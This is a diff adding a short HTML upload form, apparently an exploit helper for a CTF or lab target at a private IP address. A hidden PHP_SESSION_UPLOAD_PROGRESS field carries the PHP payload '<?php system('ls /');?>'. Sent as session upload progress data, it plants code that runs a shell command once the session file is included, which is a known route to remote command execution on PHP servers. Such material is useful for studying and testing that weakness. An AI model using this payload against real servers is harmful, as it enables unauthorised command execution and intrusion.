@@ -1,0 +1,11 @@
+<html>
+<head>
+    <title>Upload</title>
+</head>
+<body>
+  <form id= "uploadForm" method="post" enctype="multipart/form-data" action="http://172.16.0.207:16929/">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('ls /');?>"/>
+    <input type="file" name="file"/>
+    <input type="submit" value="upload"/>
+  </form>
+</body>
